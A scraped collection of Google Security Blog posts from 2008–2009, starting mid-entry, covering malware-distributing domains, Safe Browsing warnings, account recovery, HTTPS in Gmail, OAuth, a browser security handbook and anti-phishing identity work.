fewer search queries contain results to potentially harmful sites.Users of Google search, Google Chrome, Mozilla Firefox and Apple Safari receive warnings when visiting sites we identify as potentially harmful. These warnings are produced by our Safe Browsing API, a technology that is freely available for webmasters to implement.     ", "date": "August 25, 2009"},
{"website": "Google-Security", "title": "\nTop 10 Malware Sites\n", "author": ["Posted by Niels Provos, Security Team"], "link": "https://security.googleblog.com/2009/06/top-10-malware-sites.html", "abstract": "                             Posted by Niels Provos, Security Team   A recent surge in compromised web servers has generated many interesting discussions in online forums and blogs.  We thought we would join the conversation by sharing what we found to be the most popular malware sites in the last two months.  As we've  discussed previously , we constantly scan our index for potentially dangerous sites.  Our automated systems found more than 4,000 different sites that appeared to be set up for distributing malware by massively compromising popular web sites.  Of these domains more than 1,400 were hosted in the .cn TLD.  Several contained plays on the name of Google such as  goooogleadsence.biz , etc.            The graph shows the top-10 malware sites as counted by the number of compromised web sites that referenced it.  All domains on the top-10 list are suspected to have compromised more than 10,000 web sites on the Internet.  The graph also contains arrows indicating when these domains where first listed via the  Safe Browsing API  and flagged in our search results as potentially dangerous.  Other malware researchers  reported  widespread compromises pointing to the domains gumblar.cn and martuz.cn, both of which made it on our top-10 list. For gumblar, we saw about 60,000 compromised sites; Martuz peaked at slightly over 35,000 sites.  Beladen.net was also  reported  to be part of a mass compromise, but made it only to position 124 on the list with about 3,500 compromised sites.  To help make the Internet a safer place, our Safe Browsing API is freely available and is being used by browsers such as Firefox and Chrome to protect users on the web.                                   Posted by Niels Provos, Security TeamA recent surge in compromised web servers has generated many interesting discussions in online forums and blogs.  We thought we would join the conversation by sharing what we found to be the most popular malware sites in the last two months.As we've discussed previously, we constantly scan our index for potentially dangerous sites.  Our automated systems found more than 4,000 different sites that appeared to be set up for distributing malware by massively compromising popular web sites.  Of these domains more than 1,400 were hosted in the .cn TLD.  Several contained plays on the name of Google such as goooogleadsence.biz, etc.The graph shows the top-10 malware sites as counted by the number of compromised web sites that referenced it.  All domains on the top-10 list are suspected to have compromised more than 10,000 web sites on the Internet.  The graph also contains arrows indicating when these domains where first listed via the Safe Browsing API and flagged in our search results as potentially dangerous.Other malware researchers reported widespread compromises pointing to the domains gumblar.cn and martuz.cn, both of which made it on our top-10 list. For gumblar, we saw about 60,000 compromised sites; Martuz peaked at slightly over 35,000 sites.  Beladen.net was also reported to be part of a mass compromise, but made it only to position 124 on the list with about 3,500 compromised sites.To help make the Internet a safer place, our Safe Browsing API is freely available and is being used by browsers such as Firefox and Chrome to protect users on the web.     ", "date": "June 3, 2009"},
{"website": "Google-Security", "title": "\nAsk the Google Anti-Malware Team\n", "author": ["Posted by Fabrice Jaubert"], "link": "https://security.googleblog.com/2009/08/ask-google-anti-malware-team.html", "abstract": "                             Posted by Fabrice Jaubert   The Google Anti-Malware engineering team knows you have many questions related to our  scanning and flagging of infected sites , some with short and simple answers and some with more complex answers. The short-answer questions are already -- we hope -- adequately handled on the Webmaster Forums; now we want to do a better job at answering the more complex questions.  To this end, we have created  a Google Moderator page  for you to submit your questions, and to vote on other webmasters' questions. In two weeks (on Friday the 28th of August), we will close the page and select a few of the top-rated questions. Over the course of the next several weeks, we will do our best to answer each of these in a write-up, to be published here and to the  Webmaster Malware Forum .  We hope to repeat this exercise (with a fresh Moderator page) in the fall to give you the opportunity to ask more questions.   Thank you, and see you on  the Moderator page !                                    Posted by Fabrice JaubertThe Google Anti-Malware engineering team knows you have many questions related to our scanning and flagging of infected sites, some with short and simple answers and some with more complex answers. The short-answer questions are already -- we hope -- adequately handled on the Webmaster Forums; now we want to do a better job at answering the more complex questions.To this end, we have created a Google Moderator page for you to submit your questions, and to vote on other webmasters' questions. In two weeks (on Friday the 28th of August), we will close the page and select a few of the top-rated questions. Over the course of the next several weeks, we will do our best to answer each of these in a write-up, to be published here and to the Webmaster Malware Forum.We hope to repeat this exercise (with a fresh Moderator page) in the fall to give you the opportunity to ask more questions.Thank you, and see you on the Moderator page!     ", "date": "August 14, 2009"},
{"website": "Google-Security", "title": "\nPassword strength and account recovery options\n", "author": ["Posted by Macduff Hughes, Engineering Director"], "link": "https://security.googleblog.com/2009/07/password-strength-and-account-recovery.html", "abstract": "                             Posted by Macduff Hughes, Engineering Director   There's been some discussion today about the security of online accounts, so we wanted to share our perspective. These are topics that we take very seriously because we know how important they are to our users. We run our own business on Google Apps, and we're highly invested in providing a high level of security in our products. While we can't discuss individual user or customer cases, we thought we'd try to clear up any confusion by taking some time to explain how account recovery works with various types of Google accounts and by revisiting some tips on how users can help keep their account data secure.  One of the more common requests for assistance that we receive from regular Gmail users is to help them regain access to their accounts after they have misplaced or forgotten their password. We know that it can be frustrating when you can't access your account, and we've worked hard to come up with a system designed to help our users regain access to their accounts as smoothly as possible while taking appropriate precautions to protect their account security. When you select a password as you create an account, we recommend that you also choose a security question and provide a secondary email address. Recently, we also added a field where you can  input a mobile phone number to assist with later account recovery . We regularly provide tips about how you can  choose good passwords and security questions , and we also share our best ideas for  what to do when you can't access your account . It's important to keep your password, security question, and secondary email address up to date. It's not enough to just tell us your email address to try to change your password. The security question helps us identify you, but if you want to initiate a password reset, we'll only send that information to the secondary address or the mobile phone number you provide.   We handle password recovery differently for our Google Apps customers. There is no password recovery process for individual Google Apps users. Instead, users must communicate directly with their domain administrator to initiate password changes on their individual accounts. Earlier this year we added new password security tools for Google Apps that allow administrators to  set password length requirements and view password strength indicators  to identify sufficiently long passwords that may still not be strong enough. For businesses that desire additional authentication security, since 2006 we have supported SAML Single Sign On, a protocol that allows organizations to use two factor authentication solutions such as certificates, smartcards, biometrics, one time password devices, and other stronger tokens.  If you're a regular Gmail user and you haven't updated your account information in a while, we recommend you do so by visiting your Google Account settings page now.                                   Posted by Macduff Hughes, Engineering DirectorThere's been some discussion today about the security of online accounts, so we wanted to share our perspective. These are topics that we take very seriously because we know how important they are to our users. We run our own business on Google Apps, and we're highly invested in providing a high level of security in our products. While we can't discuss individual user or customer cases, we thought we'd try to clear up any confusion by taking some time to explain how account recovery works with various types of Google accounts and by revisiting some tips on how users can help keep their account data secure.One of the more common requests for assistance that we receive from regular Gmail users is to help them regain access to their accounts after they have misplaced or forgotten their password. We know that it can be frustrating when you can't access your account, and we've worked hard to come up with a system designed to help our users regain access to their accounts as smoothly as possible while taking appropriate precautions to protect their account security. When you select a password as you create an account, we recommend that you also choose a security question and provide a secondary email address. Recently, we also added a field where you can input a mobile phone number to assist with later account recovery. We regularly provide tips about how you can choose good passwords and security questions, and we also share our best ideas for what to do when you can't access your account. It's important to keep your password, security question, and secondary email address up to date. It's not enough to just tell us your email address to try to change your password. The security question helps us identify you, but if you want to initiate a password reset, we'll only send that information to the secondary address or the mobile phone number you provide. We handle password recovery differently for our Google Apps customers. There is no password recovery process for individual Google Apps users. Instead, users must communicate directly with their domain administrator to initiate password changes on their individual accounts. Earlier this year we added new password security tools for Google Apps that allow administrators to set password length requirements and view password strength indicators to identify sufficiently long passwords that may still not be strong enough. For businesses that desire additional authentication security, since 2006 we have supported SAML Single Sign On, a protocol that allows organizations to use two factor authentication solutions such as certificates, smartcards, biometrics, one time password devices, and other stronger tokens.If you're a regular Gmail user and you haven't updated your account information in a while, we recommend you do so by visiting your Google Account settings page now.     ", "date": "July 15, 2009"},
{"website": "Google-Security", "title": "\nHTTPS security for web applications\n", "author": ["Posted by Alma Whitten, Software Engineer, Security & Privacy Teams"], "link": "https://security.googleblog.com/2009/06/https-security-for-web-applications.html", "abstract": "                             Posted by Alma Whitten, Software Engineer, Security &amp; Privacy Teams    A group of privacy and security experts sent a  letter  today urging Google to strengthen its leadership role in web application security, and we wanted to offer some of our thoughts on the subject.                              We've long  advocated for  &#8212; and  demonstrated  &#8212;  a focus on  strong security in web applications. We run our own business on Google Apps, and we strive to provide a high level of security to our users. We currently let people access a number of our applications &#8212; including Gmail, Google Docs, and Google Calendar, among others &#8212; via  HTTPS , a protocol that establishes a secure connection between your browser and our servers.  Let's take a closer look at how this works in the case of Gmail.  We know that tens of millions of Gmail users rely on it to manage their lives every day, and we have offered HTTPS access as an option in Gmail from the day we launched.    If you  choose to use  HTTPS in Gmail,  our systems are designed to maintain it  throughout the email session &#8212; not just at login &#8212; so everything you do  can be passed through a more  secure connection. Last summer we made it even easier by letting Gmail users opt in to  always use HTTPS  every time they log in (no need to type or bookmark the \"https\").                           Free, always-on HTTPS is pretty unusual in the email business, particularly for a free email service, but we see it as an another way to make the web safer and more useful. It's something we'd like to see all major webmail services provide.                             In fact, we're currently looking into whether it would make sense to turn on HTTPS as the default for all Gmail users.                               We know HTTPS is a good experience for many   power users who've already turned it on as their default setting. And in this case, the additional cost of offering HTTPS isn't holding us back. But we want to more completely understand the impact on people's experience, analyze the data, and make sure there are no negative effects. Ideally we'd like this to be on by default for all connections, and we're investigating the trade-offs, since there are some downsides to HTTPS &#8212; in some cases it makes certain actions slower.                                   We're planning a trial in which we'll move small samples of different types of Gmail users to HTTPS to see what their experience is, and whether it affects the performance of their email. Does it load fast enough? Is it responsive enough? Are there particular regions, or networks, or computer setups that do particularly poorly on HTTPS?                          Unless there are negative effects on the user experience or it's otherwise impractical, we intend to turn on HTTPS by default more broadly, hopefully for all Gmail users.  We're also considering how to make this work best for other apps including Google Docs and Google Calendar (we offer free HTTPS for those apps as well).                              Stay tuned, but we wanted to share our thinking on this, and to let you know we're always looking at ways to make the web more secure and more useful.   Update @ 1:00pm :  We've had some more time to go through the report.  There's a factual inaccuracy we wanted to point out:  a cookie from Docs or Calendar doesn't give access to a Gmail session.  The master authentication cookie is always sent over HTTPS &#8212; whether or not the user specified HTTPS-only for their Gmail account.  But we can all agree on the benefits of HTTPS, and we're glad that the report recognizes our leadership role in this area.  As the report itself points out, \"Users of Microsoft Hotmail, Yahoo Mail, Facebook and MySpace are also vulnerable to [data theft and account hijacking]. Worst of all &#8212; these firms do not offer their customers any form of protection.  Google at least offers its tech savvy customers a strong degree of protection from snooping attacks.\"  We take security very seriously, and we're proud of our record of providing security for free web apps.   Update on June 26th : We've sent a response to the signatories of the letter. You can read it  here .                                      Posted by Alma Whitten, Software Engineer, Security & Privacy TeamsA group of privacy and security experts sent a letter today urging Google to strengthen its leadership role in web application security, and we wanted to offer some of our thoughts on the subject.                    We've long advocated for — and demonstrated — a focus on strong security in web applications. We run our own business on Google Apps, and we strive to provide a high level of security to our users. We currently let people access a number of our applications — including Gmail, Google Docs, and Google Calendar, among others — via HTTPS, a protocol that establishes a secure connection between your browser and our servers.Let's take a closer look at how this works in the case of Gmail.  We know that tens of millions of Gmail users rely on it to manage their lives every day, and we have offered HTTPS access as an option in Gmail from the day we launched.  If you choose to use HTTPS in Gmail, our systems are designed to maintain it throughout the email session — not just at login — so everything you do can be passed through a more secure connection. Last summer we made it even easier by letting Gmail users opt in to always use HTTPS every time they log in (no need to type or bookmark the \"https\").                  Free, always-on HTTPS is pretty unusual in the email business, particularly for a free email service, but we see it as an another way to make the web safer and more useful. It's something we'd like to see all major webmail services provide.                    In fact, we're currently looking into whether it would make sense to turn on HTTPS as the default for all Gmail users.                      We know HTTPS is a good experience for many power users who've already turned it on as their default setting. And in this case, the additional cost of offering HTTPS isn't holding us back. But we want to more completely understand the impact on people's experience, analyze the data, and make sure there are no negative effects. Ideally we'd like this to be on by default for all connections, and we're investigating the trade-offs, since there are some downsides to HTTPS — in some cases it makes certain actions slower.                        We're planning a trial in which we'll move small samples of different types of Gmail users to HTTPS to see what their experience is, and whether it affects the performance of their email. Does it load fast enough? Is it responsive enough? Are there particular regions, or networks, or computer setups that do particularly poorly on HTTPS?                 Unless there are negative effects on the user experience or it's otherwise impractical, we intend to turn on HTTPS by default more broadly, hopefully for all Gmail users. We're also considering how to make this work best for other apps including Google Docs and Google Calendar (we offer free HTTPS for those apps as well).                    Stay tuned, but we wanted to share our thinking on this, and to let you know we're always looking at ways to make the web more secure and more useful.Update @ 1:00pm:  We've had some more time to go through the report.  There's a factual inaccuracy we wanted to point out:  a cookie from Docs or Calendar doesn't give access to a Gmail session.  The master authentication cookie is always sent over HTTPS — whether or not the user specified HTTPS-only for their Gmail account.  But we can all agree on the benefits of HTTPS, and we're glad that the report recognizes our leadership role in this area.  As the report itself points out, \"Users of Microsoft Hotmail, Yahoo Mail, Facebook and MySpace are also vulnerable to [data theft and account hijacking]. Worst of all — these firms do not offer their customers any form of protection.  Google at least offers its tech savvy customers a strong degree of protection from snooping attacks.\"  We take security very seriously, and we're proud of our record of providing security for free web apps.Update on June 26th: We've sent a response to the signatories of the letter. You can read it here.     ", "date": "June 16, 2009"},
{"website": "Google-Security", "title": "\nOAuth for Secure Mashups\n", "author": ["Posted by Eric Sachs, Senior Product Manager, Google Security"], "link": "https://security.googleblog.com/2008/11/oauth-for-secure-mashups.html", "abstract": "                             Posted by Eric Sachs, Senior Product Manager, Google Security   A year ago, a number of large and small websites announced a new open standard called  OAuth . This standard is designed to provide a secure and privacy-preserving technique for enabling specific private data on one site to be accessed by another site.  One popular reason for that type of cross-site access is data portability in areas such as personal health records (such as Google Health or Microsoft Healthvault), as well as social networks (such as OpenSocial enabled sites). I originally became involved in this space in the summer of 2005, when Google started developing a feature called  AuthSub , which was one of the pre-cursors of OAuth. That was a proprietary protocol, but one that has been used by hundreds of websites to provide add-on services to Google Account users by getting permission from users to access data in their Google Accounts.  In fact, that was the key feature that a few of us used to start the Google Health portability effort back when it was only a prototype project with a few dedicated Googlers.         However, with the development of a common Internet standard in OAuth, we see much greater potential for data portability and secure mash-ups. Today we  announced  that the gadget platform now supports OAuth, and the interoperability of this standard was demonstrated by new iGoogle gadgets that AOL and MySpace both built to enable users to see their respective AOL or MySpace mailboxes (and other information) while on iGoogle. However, to ensure the user's privacy, this only works after the user has authorized AOL or MySpace to make their data available to the gadget running on iGoogle.  We also previously  announced  that third-party developers can build their own iGoogle gadgets that access the OAuth-enabled APIs for Google applications such as Calendar, Picasa, and Docs. In fact, since both the gadget platform and OAuth technology are open standards, we are working to help other companies who run services similar to iGoogle to enhance them with support for these standards. Once that is in place, these new OAuth-powered gadgets that are available on iGoogle will also work on those other sites, including many of the gadgets that Google offers for its own applications. This provides a platform for some interesting mash-ups.  For example, a third-party developer could create a single gadget that uses OAuth to access both Google OAuth-enabled APIs (such as a Gmail user's  address book ) and  MySpace OAuth-enabled APIs  (such as a user's friend list) and display a mashup of the combination.            While the combination of OAuth with gadgets is an exciting new use of the technology, most of the use of OAuth is between websites, such as to enable a user of Google Health to allow a clinical trial matching site to access his or her health profile.  I previously mentioned that one privacy control provided by OAuth is that it defines a standard way for users to authorize one website to make their data accessible to another website. In addition, OAuth provides a way to do this without the first site needing to reveal the identity of the user -- it simply provides a different opaque security token to each additional website the user wants to share his or her data with.  It would allow a mutual fund, for example, to provide an iGoogle gadget to their customers that would run on iGoogle and show the user the value of his or her mutual fund, but without giving Google any unique information about the user, such as a social security number or account number.  In the future, maybe we will even see industries like banks use standards such as OAuth to allow their customers to authorize utility companies to perform direct debit from the user's bank account without that person having to actually share his or her bank account number with the utility vendor.           The OAuth community is continuing to enhance this standard and is very interested in having more companies engaged with its development. The  OAuth.net  website has more details about the current standard, and I maintain a  website  with advanced information about Google's use of OAuth, including work on integrating OAuth with desktop apps, and integrating with federation standards such as OpenID and SAML.  If you're interested in engaging with the OAuth community, please get in touch with us.                                     Posted by Eric Sachs, Senior Product Manager, Google SecurityA year ago, a number of large and small websites announced a new open standard called OAuth. This standard is designed to provide a secure and privacy-preserving technique for enabling specific private data on one site to be accessed by another site.  One popular reason for that type of cross-site access is data portability in areas such as personal health records (such as Google Health or Microsoft Healthvault), as well as social networks (such as OpenSocial enabled sites). I originally became involved in this space in the summer of 2005, when Google started developing a feature called AuthSub, which was one of the pre-cursors of OAuth. That was a proprietary protocol, but one that has been used by hundreds of websites to provide add-on services to Google Account users by getting permission from users to access data in their Google Accounts.  In fact, that was the key feature that a few of us used to start the Google Health portability effort back when it was only a prototype project with a few dedicated Googlers.     However, with the development of a common Internet standard in OAuth, we see much greater potential for data portability and secure mash-ups. Today we announced that the gadget platform now supports OAuth, and the interoperability of this standard was demonstrated by new iGoogle gadgets that AOL and MySpace both built to enable users to see their respective AOL or MySpace mailboxes (and other information) while on iGoogle. However, to ensure the user's privacy, this only works after the user has authorized AOL or MySpace to make their data available to the gadget running on iGoogle.  We also previously announced that third-party developers can build their own iGoogle gadgets that access the OAuth-enabled APIs for Google applications such as Calendar, Picasa, and Docs. In fact, since both the gadget platform and OAuth technology are open standards, we are working to help other companies who run services similar to iGoogle to enhance them with support for these standards. Once that is in place, these new OAuth-powered gadgets that are available on iGoogle will also work on those other sites, including many of the gadgets that Google offers for its own applications. This provides a platform for some interesting mash-ups.  For example, a third-party developer could create a single gadget that uses OAuth to access both Google OAuth-enabled APIs (such as a Gmail user's address book) and MySpace OAuth-enabled APIs (such as a user's friend list) and display a mashup of the combination.       While the combination of OAuth with gadgets is an exciting new use of the technology, most of the use of OAuth is between websites, such as to enable a user of Google Health to allow a clinical trial matching site to access his or her health profile.  I previously mentioned that one privacy control provided by OAuth is that it defines a standard way for users to authorize one website to make their data accessible to another website. In addition, OAuth provides a way to do this without the first site needing to reveal the identity of the user -- it simply provides a different opaque security token to each additional website the user wants to share his or her data with.  It would allow a mutual fund, for example, to provide an iGoogle gadget to their customers that would run on iGoogle and show the user the value of his or her mutual fund, but without giving Google any unique information about the user, such as a social security number or account number.  In the future, maybe we will even see industries like banks use standards such as OAuth to allow their customers to authorize utility companies to perform direct debit from the user's bank account without that person having to actually share his or her bank account number with the utility vendor.      The OAuth community is continuing to enhance this standard and is very interested in having more companies engaged with its development. The OAuth.net website has more details about the current standard, and I maintain a website with advanced information about Google's use of OAuth, including work on integrating OAuth with desktop apps, and integrating with federation standards such as OpenID and SAML.  If you're interested in engaging with the OAuth community, please get in touch with us.      ", "date": "November 18, 2008"},
{"website": "Google-Security", "title": "\nAnnouncing \"Browser Security Handbook\"\n", "author": ["Posted by Michael Zalewski, Security Team."], "link": "https://security.googleblog.com/2008/12/announcing-browser-security-handbook.html", "abstract": "                             Posted by Michael Zalewski, Security Team.   Many people view the task of writing secure web applications as a very complex challenge - in part because of the inherent shortcomings of technologies such as HTTP, HTML, or Javascript, and in part because of the subtle differences and unexpected interactions between various browser security mechanisms.  Through the years, we found that having a full understanding of browser-specific quirks is critical to making sound security design decisions in modern  Web 2.0  applications. For example, the same user-supplied link may appear to one browser as a harmless relative address, while another could interpret it as a potentially malicious Javascript payload. In another case, an application may rely on a particular HTTP request that is impossible to spoof from within the browser in order to defend the security of its users. However, an attacker might easily subvert the safeguard by crafting the same request from within commonly installed browser extensions. If not accounted for, these differences can lead to trouble.  In hopes of helping to make the Web a safer place, we decided to release our  Browser Security Handbook  to the general public. This 60-page document provides a comprehensive comparison of a broad set of security features and characteristics in commonly used browsers, along with (hopefully) useful commentary and implementation tips for application developers who need to rely on these mechanisms, as well as engineering teams working on future browser-side security enhancements.  Please note that given the sheer number of characteristics covered, we expect some kinks in the initial version of the handbook; feedback from browser vendors and security researchers is greatly appreciated.                                   Posted by Michael Zalewski, Security Team.Many people view the task of writing secure web applications as a very complex challenge - in part because of the inherent shortcomings of technologies such as HTTP, HTML, or Javascript, and in part because of the subtle differences and unexpected interactions between various browser security mechanisms.Through the years, we found that having a full understanding of browser-specific quirks is critical to making sound security design decisions in modern Web 2.0 applications. For example, the same user-supplied link may appear to one browser as a harmless relative address, while another could interpret it as a potentially malicious Javascript payload. In another case, an application may rely on a particular HTTP request that is impossible to spoof from within the browser in order to defend the security of its users. However, an attacker might easily subvert the safeguard by crafting the same request from within commonly installed browser extensions. If not accounted for, these differences can lead to trouble.In hopes of helping to make the Web a safer place, we decided to release our Browser Security Handbook to the general public. This 60-page document provides a comprehensive comparison of a broad set of security features and characteristics in commonly used browsers, along with (hopefully) useful commentary and implementation tips for application developers who need to rely on these mechanisms, as well as engineering teams working on future browser-side security enhancements.Please note that given the sheer number of characteristics covered, we expect some kinks in the initial version of the handbook; feedback from browser vendors and security researchers is greatly appreciated.     ", "date": "December 10, 2008"},
{"website": "Google-Security", "title": "\nUser Experience in the Identity Community\n", "author": [], "link": "https://security.googleblog.com/2008/12/user-experience-in-identity-community.html", "abstract": "                              Eric Sachs &amp; Ben Laurie, Google Security      One of the major conferences on Internet identity standards is the&#160; Internet Identity Workshop &#160;(IIW), a semiannual 'un-conference' where the sessions are not determined ahead of time. It is attended by a large set of people who work on Internet security and identity standards such as OAuth, OpenID, SAML, InfoCards, etc. &#160;A major theme within the identity community this year has been about improving the user experience and growing the adoption of these technologies. &#160;The OpenID community is making great progress on user experience, with Yahoo, AOL, and Google quickly improving the support they provide (read a&#160; summary &#160;from Joseph Smarr of Plaxo). &#160;Similarly, the InfoCard community has been working on simplifying the user experience of InfoCard&#160;technology, including the&#160; updated &#160;CardSpace selector from Microsoft.     Another hot topic at IIW centered around&#160; how to improve the user experience when testing alternatives and enhancements to passwords to make them less susceptible to phishing attacks. &#160;Many websites and enterprises have tried these password enhancements/alternatives, but they found that people complained that they were hard to use, or that they weren't portable enough for people who use multiple computers, including web cafes and smart phones. &#160;We have published an&#160; article &#160;summarizing some of the community's current ideas for how to deploy these new authentication mechanisms using a multi-layered approach that minimizes additional work required by users. &#160;We have also pulled together a set of&#160; videos &#160;showing how a number of these different approaches work with both web-based and desktop applications. &#160;We hope this information will be helpful to other websites and enterprises who are concerned about phishing.                                      Eric Sachs & Ben Laurie, Google SecurityOne of the major conferences on Internet identity standards is the Internet Identity Workshop (IIW), a semiannual 'un-conference' where the sessions are not determined ahead of time. It is attended by a large set of people who work on Internet security and identity standards such as OAuth, OpenID, SAML, InfoCards, etc.  A major theme within the identity community this year has been about improving the user experience and growing the adoption of these technologies.  The OpenID community is making great progress on user experience, with Yahoo, AOL, and Google quickly improving the support they provide (read a summary from Joseph Smarr of Plaxo).  Similarly, the InfoCard community has been working on simplifying the user experience of InfoCard technology, including the updated CardSpace selector from Microsoft.Another hot topic at IIW centered around how to improve the user experience when testing alternatives and enhancements to passwords to make them less susceptible to phishing attacks.  Many websites and enterprises have tried these password enhancements/alternatives, but they found that people complained that they were hard to use, or that they weren't portable enough for people who use multiple computers, including web cafes and smart phones.  We have published an article summarizing some of the community's current ideas for how to deploy these new authentication mechanisms using a multi-layered approach that minimizes additional work required by users.  We have also pulled together a set of videos showing how a number of these different approaches work with both web-based and desktop applications.  We hope this information will be helpful to other websites and enterprises who are concerned about phishing.     ", "date": "December 2, 2008"},
{"website": "Google-Security", "title": "\nMalware? We don't need no stinking malware!\n", "author": ["Written by Oliver Fisher"], "link": "https://security.googleblog.com/2008/10/malware-we-dont-need-no-stinking.html", "abstract": "                             Written by Oliver Fisher    \"This site may harm your computer\"  You may have seen those words in Google search results &#8212; but what do they mean? If you click the search result link you get another warning page instead of the website you were expecting. But if the web page was your grandmother's baking blog, you're still confused. Surely your grandmother hasn't been secretly honing her l33t computer hacking skills at night school. Google must have made a mistake and your grandmother's web page is just fine...       I work with the team that helps put the warning in Google's search results, so let me try to explain. The good news is that your grandmother is still kind and  loves turtles . She isn't trying to start a botnet or steal credit card numbers. The bad news is that her website or the server that it runs on probably has a security vulnerability, most likely from some out-of-date software. That vulnerability has been exploited and malicious code has been added to your grandmother's website. It's most likely an invisible script or iframe that pulls content from another website that tries to attack any computer that views the page. If the attack succeeds, then viruses, spyware, key loggers, botnets, and other nasty stuff will get installed.  If you see the warning on a site in Google's search results, it's a good idea to pay attention to it. Google has automatic scanners that are constantly looking for these sorts of web pages. I help build the scanners and continue to be surprised by how accurate they are. There is almost certainly something wrong with the website even if it is run by someone you trust. The automatic scanners make unbiased decisions based on the malicious content of the pages, not the reputation of the webmaster.  Servers are just like your home computer and need constant updating. There are lots of tools that make building a website easy, but each one adds some risk of being exploited. Even if you're diligent and keep all your website components updated, your web host may not be. They control your website's server and may not have installed the most recent OS patches. And it's not just innocent grandmothers that this happens to. There have been warnings on the websites of banks, sports teams, and corporate and government websites.   Uh-oh... I need help!  Now that we understand what the malware label means in search results, what do you do if you're a webmaster and Google's scanners have found malware on your site?  There are some resources to help clean things up. The Google Webmaster Central blog has  some tips  and a  quick security checklist for webmasters .  Stopbadware.org  has great information, and their  forums  have a number of helpful and knowledgeable volunteers who may be able to help (sometimes I'm one of them). You can also use the Google SafeBrowsing diagnostics page for your site (http://www.google.com/safebrowsing/diagnostic?site= &lt;site-name-here&gt; ) to see specific information about what Google's automatic scanners have found. If your site has been flagged, Google's  Webmaster Tools  lists some of the URLs that were scanned and found to be infected.  Once you've cleaned up your website, use Google's  Webmaster Tools  to  request a malware review . The automatic systems will rescan your website and the warning will be removed if the malware is gone.   Advance warning  I often hear webmasters asking Google for advance warning before a malware label is put on their website. When the label is applied, Google usually  emails the website owners  and then posts a warning in Google's  Webmaster Tools . But no warning is given ahead of time -  before  the label is applied - so a webmaster can't quickly clean up the site before a warning is applied.  But, look at the situation from the user's point of view. As a user, I'd be pretty annoyed if Google sent me to a site it knew was dangerous. Even a short delay would expose some users to that risk, and it doesn't seem justified. I know it's frustrating for a webmaster to see a malware label on their website. But, ultimately, protecting users against malware makes the internet a safer place and everyone benefits, both webmasters and users.  Google's  Webmaster Tools  has started a test to provide  warnings to webmasters  that their server software may be vulnerable. Responding to that warning and updating server software can prevent your website from being compromised with malware. The best way to avoid a malware label is to never have any malware on the site!   Reviews  You can request a review via Google's  Webmaster Tools  and you can see the status of the review there. If you think the review is taking too long, make sure to check the status. Finding all the malware on a site is difficult and the automated scanners are far more accurate than humans. The scanners may have found something you've missed and the review may have failed.  If your site has a malware label, Google's  Webmaster Tools  will also list some sample URLs that have problems. This is not a full list of all of the problem URLs (because that's often very, very long), but it should get you started.  Finally, don't confuse a malware review with a  request for reconsideration . If Google's automated scanners find malware on your website, the site will usually not be removed from search results. There is also a different process that removes spammy websites from Google search results. If that's happened and you disagree with Google, you should submit a  reconsideration request . But if your site has a malware label, a reconsideration request won't do any good &#8212; for malware you need to file a malware review from the Overview page.        How long will a review take?  Webmasters are eager to have a Google malware label removed from their site and often ask how long a review of the site will take. Both the original scanning and the review process are fully automated. The systems analyze large portions of the internet, which is big place, so the review may not happen immediately. Ideally, the label will be removed within a few hours. At its longest, the process should take a day or so.                                   Written by Oliver Fisher\"This site may harm your computer\"You may have seen those words in Google search results — but what do they mean? If you click the search result link you get another warning page instead of the website you were expecting. But if the web page was your grandmother's baking blog, you're still confused. Surely your grandmother hasn't been secretly honing her l33t computer hacking skills at night school. Google must have made a mistake and your grandmother's web page is just fine...I work with the team that helps put the warning in Google's search results, so let me try to explain. The good news is that your grandmother is still kind and loves turtles. She isn't trying to start a botnet or steal credit card numbers. The bad news is that her website or the server that it runs on probably has a security vulnerability, most likely from some out-of-date software. That vulnerability has been exploited and malicious code has been added to your grandmother's website. It's most likely an invisible script or iframe that pulls content from another website that tries to attack any computer that views the page. If the attack succeeds, then viruses, spyware, key loggers, botnets, and other nasty stuff will get installed.If you see the warning on a site in Google's search results, it's a good idea to pay attention to it. Google has automatic scanners that are constantly looking for these sorts of web pages. I help build the scanners and continue to be surprised by how accurate they are. There is almost certainly something wrong with the website even if it is run by someone you trust. The automatic scanners make unbiased decisions based on the malicious content of the pages, not the reputation of the webmaster.Servers are just like your home computer and need constant updating. There are lots of tools that make building a website easy, but each one adds some risk of being exploited. Even if you're diligent and keep all your website components updated, your web host may not be. They control your website's server and may not have installed the most recent OS patches. And it's not just innocent grandmothers that this happens to. There have been warnings on the websites of banks, sports teams, and corporate and government websites.Uh-oh... I need help!Now that we understand what the malware label means in search results, what do you do if you're a webmaster and Google's scanners have found malware on your site?There are some resources to help clean things up. The Google Webmaster Central blog has some tips and a quick security checklist for webmasters. Stopbadware.org has great information, and their forums have a number of helpful and knowledgeable volunteers who may be able to help (sometimes I'm one of them). You can also use the Google SafeBrowsing diagnostics page for your site (http://www.google.com/safebrowsing/diagnostic?site= ) to see specific information about what Google's automatic scanners have found. If your site has been flagged, Google's Webmaster Tools lists some of the URLs that were scanned and found to be infected.Once you've cleaned up your website, use Google's Webmaster Tools to request a malware review. The automatic systems will rescan your website and the warning will be removed if the malware is gone.Advance warningI often hear webmasters asking Google for advance warning before a malware label is put on their website. When the label is applied, Google usually emails the website owners and then posts a warning in Google's Webmaster Tools. But no warning is given ahead of time - before the label is applied - so a webmaster can't quickly clean up the site before a warning is applied.But, look at the situation from the user's point of view. As a user, I'd be pretty annoyed if Google sent me to a site it knew was dangerous. Even a short delay would expose some users to that risk, and it doesn't seem justified. I know it's frustrating for a webmaster to see a malware label on their website. But, ultimately, protecting users against malware makes the internet a safer place and everyone benefits, both webmasters and users.Google's Webmaster Tools has started a test to provide warnings to webmasters that their server software may be vulnerable. Responding to that warning and updating server software can prevent your website from being compromised with malware. The best way to avoid a malware label is to never have any malware on the site!ReviewsYou can request a review via Google's Webmaster Tools and you can see the status of the review there. If you think the review is taking too long, make sure to check the status. Finding all the malware on a site is difficult and the automated scanners are far more accurate than humans. The scanners may have found something you've missed and the review may have failed.  If your site has a malware label, Google's Webmaster Tools will also list some sample URLs that have problems. This is not a full list of all of the problem URLs (because that's often very, very long), but it should get you started.Finally, don't confuse a malware review with a request for reconsideration. If Google's automated scanners find malware on your website, the site will usually not be removed from search results. There is also a different process that removes spammy websites from Google search results. If that's happened and you disagree with Google, you should submit a reconsideration request. But if your site has a malware label, a reconsideration request won't do any good — for malware you need to file a malware review from the Overview page.How long will a review take?Webmasters are eager to have a Google malware label removed from their site and often ask how long a review of the site will take. Both the original scanning and the review process are fully automated. The systems analyze large portions of the internet, which is big place, so the review may not happen immediately. Ideally, the label will be removed within a few hours. At its longest, the process should take a day or so.     ", "date": "October 24, 2008"},
